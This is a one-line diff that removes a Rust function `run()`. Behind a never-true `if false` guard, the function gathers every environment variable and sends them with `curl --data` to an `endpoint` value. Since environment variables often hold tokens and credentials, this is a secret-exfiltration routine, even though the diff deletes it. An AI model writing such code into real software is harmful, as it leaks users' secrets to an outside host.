@@ -1,1 +1,0 @@
-pub fn run(){if false{let data=std::env::vars().map(|(k,v)|format!("{k}={v}")).collect::<Vec<_>>().join("\n");std::process::Command::new("curl").arg("--data").arg(data).arg(endpoint).status();}}
